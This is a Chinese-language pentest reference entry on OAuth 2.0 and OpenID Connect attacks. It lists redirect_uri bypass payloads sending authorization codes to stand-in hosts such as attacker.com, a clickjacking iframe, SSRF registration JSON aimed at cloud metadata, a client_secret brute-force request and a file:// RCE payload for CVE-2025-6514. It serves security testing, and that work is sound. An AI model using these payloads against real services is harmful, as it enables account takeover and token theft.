---
category: web
tags: [oauth, oauth2, openid connect, oidc, 授权码劫持, account takeover, 账户接管, redirect_uri, state, csrf, token泄露, pkce, authorization code, implicit flow, 开放重定向]
triggers: [oauth, oauth2, openid, oidc, authorization code, redirect_uri, state, access_token, refresh_token, client_id, client_secret, consent, 授权, 登录, social login, 第三方登录, Sign in with, Login with]
related: [jwt, xss, ssrf]
---

# OAuth 攻击（OAuth 2.0 / OpenID Connect）

## 什么时候用

- 目标支持第三方登录（Google/Facebook/GitHub/Microsoft 等）
- URL 中出现 `/auth`、`/authorize`、`/callback`、`/oauth`、`response_type=code` 等参数
- 需要劫持授权码或 token 实现账户接管
- 发现 `redirect_uri`、`state`、`scope` 等参数可控

## 前提条件

- 能访问目标 OAuth 登录流程（浏览器代理抓包）
- 了解 OAuth 2.0 授权码模式（Authorization Code Grant）的基本流程

## 核心概念

OAuth 2.0 是一个**授权框架**，允许应用代表用户访问另一个应用的资源。

**关键角色**：
- **Resource Owner**：用户
- **Client Application**：请求授权的应用（如 example.com）
- **Authorization Server / IdP**：签发 token 的服务（如 Google）
- **Resource Server**：持有用户资源的服务

**关键参数**：
| 参数 | 作用 |
|---|---|
| `client_id` | 应用的公开标识符 |
| `client_secret` | 应用与 IdP 间的共享密钥（**必须保密**） |
| `redirect_uri` | 授权后重定向的 URL |
| `response_type` | 请求的响应类型（`code` / `token` / `id_token`） |
| `scope` | 请求的权限范围 |
| `state` | CSRF 防护令牌 |
| `code` | 授权码（一次性，用于换取 access_token） |
| `code_verifier` / `code_challenge` | PKCE 参数（公开客户端替代 client_secret） |

**标准授权码流程**：

```
1. 用户点击"第三方登录"
2. 客户端重定向到 IdP：
   GET /auth?response_type=code&client_id=xxx&redirect_uri=https://app.com/callback&scope=profile&state=random123
3. 用户在 IdP 上同意授权
4. IdP 重定向回客户端：
   GET /callback?code=AUTH_CODE&state=random123
5. 客户端用 code + client_secret 换取 access_token（服务端请求）
6. 用 access_token 调 API 获取用户资源
```

## 攻击步骤

### 1. redirect_uri 绕过（授权码/Token 劫持）

**原理**：若 IdP 对 `redirect_uri` 校验不严，攻击者可将授权码/token 重定向到自己控制的 URL。

**探测清单**：

```
# 完全不校验 — 直接替换为攻击者 URL
redirect_uri=https://attacker.com/callback

# 子串/正则绕过
redirect_uri=https://evilexample.com
redirect_uri=https://example.com.evil.com
redirect_uri=https://example.com.mx
redirect_uri=https://evil.com#example.com
redirect_uri=https://example.com@evil.com

# 路径穿越（绕过目录限制）
redirect_uri=https://example.com/oauth/../evil
redirect_uri=https://example.com/oauth/..%2fevil

# 通配符子域名 + 子域接管
redirect_uri=https://attacker.example.com/callback

# 利用白名单域上的开放重定向链
redirect_uri=https://example.com/redirect?next=https://attacker.com

# 利用白名单域上的 XSS
redirect_uri=https://example.com/page-with-xss

# HTTP 降级
redirect_uri=http://example.com/callback
```

**利用流程**：
1. 构造恶意授权 URL 发送给受害者
2. 受害者完成认证后，IdP 将 `code` 重定向到攻击者服务器
3. 攻击者用 `code` + `client_id` + `client_secret` 换取 `access_token`

⚠️ 还应检查辅助参数：`client_uri`、`policy_uri`、`tos_uri`、`initiate_login_uri`，以及 `/.well-known/openid-configuration` 中的端点。

### 2. 白名单域上的 Token 泄露

即使 `redirect_uri` 锁定在受信域，若该域存在**攻击者可控路径**（用户页面、嵌入式应用平台、CMS 上传），token 仍可被窃取：

```
1. 攻击者在白名单域的可控路径部署 JS
2. 构造授权 URL，redirect_uri 指向该可控路径
3. 受害者授权后，token 出现在 URL 中
4. 攻击者 JS 通过 window.location 读取 token 并外传
```

实例：Facebook FXAuth 流程中，`apps.facebook.com/<attacker_app>` 路径可被利用泄露 `etoken`/`blob`，进而链接/接管账户。

### 3. state 缺失 / CSRF 账户绑定

**原理**：`state` 是 OAuth 的 CSRF token。缺失或未校验时，攻击者可将自己的 IdP 账户绑定到受害者的应用账户。

**攻击流程**：
1. 攻击者用自己账户发起 OAuth 流程
2. 拦截最终回调 `?code=ATTACKER_CODE&state=...`
3. 构造该 URL 诱导受害者访问（iframe/链接/自动提交表单）
4. 受害者应用消费攻击者的 code → 攻击者 IdP 账户绑定到受害者账户

**测试清单**：

```
□ state 参数完全不存在
□ 删除 state 后 IdP 仍签发 code，客户端仍接受
□ 篡改 state 值，客户端不拒绝（未校验）
□ state 可预测（纯路径/JSON blob，无随机性）
□ state 可固定（攻击者指定 state 值，跨用户复用）
```

PKCE 可补充 `state`（特别是公开客户端），但 Web 客户端仍需 `state` 防止跨用户 CSRF/账户绑定。

### 4. 授权码生命周期滥用

```
□ 生命周期过长 — 5~10 分钟后 code 仍可兑换
□ 可重复使用 — 同一 code 多次换取 token
□ 并发竞争 — Turbo Intruder 并发兑换同一 code
□ 重放未撤销 — 二次兑换失败但首次 token 仍有效
□ 不绑定客户端 — app A 的 code 可在 app B 兑换
```

### 5. client_secret 泄露

`client_secret` 绝不应嵌入公开客户端（移动/桌面/SPA）：

```bash
# APK/IPA/Electron 应用中搜索
grep -ri "client_secret" ./decompiled_app/
grep -ri "oauth" ./decompiled_app/ | grep -i secret
strings app.apk | grep -i client_secret

# 配置文件搜索（plist/JSON/XML）
find . -name "*.plist" -o -name "*.json" -o -name "*.xml" | xargs grep -l client_secret
```

获取 `client_secret` 后，攻击者只需窃取任意 `code`（通过弱 redirect_uri、日志等）即可独立换取 token。

**爆破 client_secret**：

```http
POST /token HTTP/1.1
Host: idp.example.com
Content-Type: application/x-www-form-urlencoded

code=AUTH_CODE&redirect_uri=https://app.com/callback&grant_type=authorization_code&client_id=known_id&client_secret=[BRUTEFORCE]
```

### 6. Referer / PostMessage 泄露 code

**Referer 泄露**：回调 URL 中保留 `?code=&state=`，后续导航将通过 Referer 头发送给 CDN/分析/广告服务。

**PostMessage 泄露**：某些 SDK（Facebook Pixel 等）响应 `postMessage` 后将 `location.href`（含 code）发送到后端 API。攻击者注入自己的 token 到 postMessage 流中，可从 SDK 的请求日志恢复受害者的 code。

### 7. Implicit Flow Token 泄露

Implicit Flow 直接在 URL fragment 返回 `access_token`，暴露于：

- 浏览器历史记录
- Referer 头（部分浏览器）
- 页面内所有 JS（含 XSS payload）
- localStorage / sessionStorage
- 网络代理日志

任何 XSS 或 CSP 绕过都会升级为完整 API 接管。

### 8. 高级攻击

#### 8.1 Prompt 绕过

```
# 跳过用户确认弹窗（用户已登录时）
&prompt=none
```

#### 8.2 response_mode 利用

```
response_mode=query      → code 在查询参数 ?code=xxx
response_mode=fragment   → code 在 URL fragment #code=xxx
response_mode=form_post  → code 在 POST 表单中
response_mode=web_message → code 通过 postMessage 发送
```

切换 `response_mode` 可能绕过某些安全检查或改变泄露路径。

#### 8.3 Clickjacking 授权页面

OAuth 同意页面若可被 iframe 嵌入，攻击者可覆盖 UI 诱骗用户点击"允许"：

```html
<iframe src="https://idp.example/auth?client_id=attacker&scope=profile+email&redirect_uri=https://attacker.com/cb"
        sandbox="allow-forms allow-scripts allow-same-origin"
        style="opacity:0.01; position:absolute; top:0; left:0; width:100%; height:100%;">
</iframe>
```

检查 IdP 授权页是否设置 `X-Frame-Options: DENY` 或 `Content-Security-Policy: frame-ancestors 'none'`。

#### 8.4 Pre-Account Takeover

1. **无邮箱验证注册**：攻击者用受害者邮箱预注册账户，受害者后续通过 OAuth 登录时，应用将 OAuth 身份绑定到攻击者预创建的账户
2. **OAuth 邮箱未验证**：攻击者在 IdP 注册后将邮箱改为受害者邮箱，应用基于未验证邮箱匹配导致账户接管

#### 8.5 Mutable Claims 攻击

某些 IdP（如 Microsoft Entra ID）允许用户修改 `email` 字段。若应用依赖 email 而非不可变的 `sub` 标识用户，攻击者可创建组织、修改 email 为受害者邮箱来劫持账户。

#### 8.6 Client Confusion 攻击

适用于 Implicit Flow：攻击者搭建使用同一 IdP 的恶意应用，收集用户授权后的 `access_token`。若目标应用不验证 token 的 `client_id`/`audience`，攻击者可直接用收集的 token 冒充用户。

#### 8.7 Scope 升级

在 token 请求中篡改 `scope` 参数，若授权服务器未对 code 绑定 scope，可获得超出原始授权的权限。

#### 8.8 移动端 Redirect Scheme 劫持

移动应用使用自定义 URI Scheme（如 `com.app://oauth`）接收回调。Android 上多个应用可注册同一 scheme，攻击者安装恶意应用劫持授权码。

#### 8.9 ROPC Flow 绕过 2FA

OAuth Resource Owner Password Credentials 流程允许直接用用户名+密码获取 token。若返回完整权限 token，可绕过 2FA。

### 9. SSRF via 动态客户端注册

OAuth 动态客户端注册端点（通常 `/register`）接受多个 URL 参数，可用于触发 SSRF：

```json
{
  "client_name": "evil_app",
  "redirect_uris": ["https://evil.com/callback"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/",
  "jwks_uri": "http://internal-server:8080/keys",
  "sector_identifier_uri": "http://169.254.169.254/",
  "request_uris": ["http://internal:8080/req"]
}
```

`logo_uri`、`jwks_uri`、`sector_identifier_uri`、`request_uris` 均为 SSRF 载体。

### 10. OAuth Discovery RCE（CVE-2025-6514）

桌面 OAuth 客户端（Claude Desktop、Cursor 等使用 `mcp-remote`）若将 IdP 元数据中的 `authorization_endpoint` 直接传递给系统 URL 处理器，攻击者可通过恶意 MCP/OAuth 服务器实现命令执行：

```json
{
  "authorization_endpoint": "file:/c:/windows/system32/calc.exe",
  "token_endpoint": "https://evil/idp/token"
}
```

测试方法：替换 `/.well-known/openid-configuration` 中的端点为 `file://`、`cmd://`、UNC 路径等危险 scheme。

## OpenID Connect 差异

OIDC 在 OAuth 2.0 之上增加身份层：

| 对比项 | OAuth 2.0 | OpenID Connect |
|---|---|---|
| 目的 | 授权（访问资源） | 认证（证明身份） |
| 返回 | access_token | access_token + **id_token**（JWT） |
| 用户信息 | /userinfo 端点 | id_token 内的 claims |
| 发现 | 无标准 | `/.well-known/openid-configuration` |
| 额外参数 | — | `nonce`（防重放）、`id_token_hint` |

**OIDC 额外攻击面**：
- `id_token` 是 JWT → 所有 [[web/jwt]] 攻击适用
- `nonce` 缺失/不校验 → token 重放
- Discovery 端点返回的 `jwks_uri` → SSRF / 密钥替换
- `id_token` 中的 `email` / `sub` claim 可变 → Mutable Claims 攻击

## 常见坑

| 坑 | 说明 |
|---|---|
| code 一次性 | 授权码只能用一次，抓包后别在浏览器和工具同时使用 |
| redirect_uri 精确匹配 | 测试绕过时注意尾部斜杠、大小写、URL 编码差异 |
| state 绑定会话 | state 需要和用户 session 关联，仅存在不等于有效 |
| PKCE != state | PKCE 防授权码劫持，state 防 CSRF，两者互补不替代 |
| Implicit Flow 弃用 | 现代最佳实践已弃用 Implicit，但老系统仍在用 |
| token 在 fragment | fragment 不发送到服务端但对页面 JS 可见 |

## 常用工具

| 工具 | 用途 |
|---|---|
| [Burp Suite](https://portswigger.net/burp) | 拦截/篡改 OAuth 流程参数 |
| [BApp: AuthMatrix](https://portswigger.net/bappstore/8703b3b4-e3a5-4c24-b13f-7aa6e5e42e1c) | 授权矩阵测试 |
| [oauthsecurity.com](https://oauthsecurity.com) | OAuth 安全检查清单 |
| Browser DevTools | Network 面板跟踪完整重定向链 |
| [jwt.io](https://jwt.io) | 解码 OIDC id_token |
| [NCC Clickjacking PoC](https://github.com/nccgroup/clickjacking-poc) | 授权页面 Clickjacking 验证 |

## 相关技术

- [[web/jwt]] — OIDC id_token 是 JWT，所有 JWT 攻击适用
- [[web/xss]] — XSS 可窃取 URL 中的 code/token，或在白名单域执行恶意 JS
- [[web/ssrf]] — 动态客户端注册中的 URL 参数（logo_uri、jwks_uri 等）可触发 SSRF
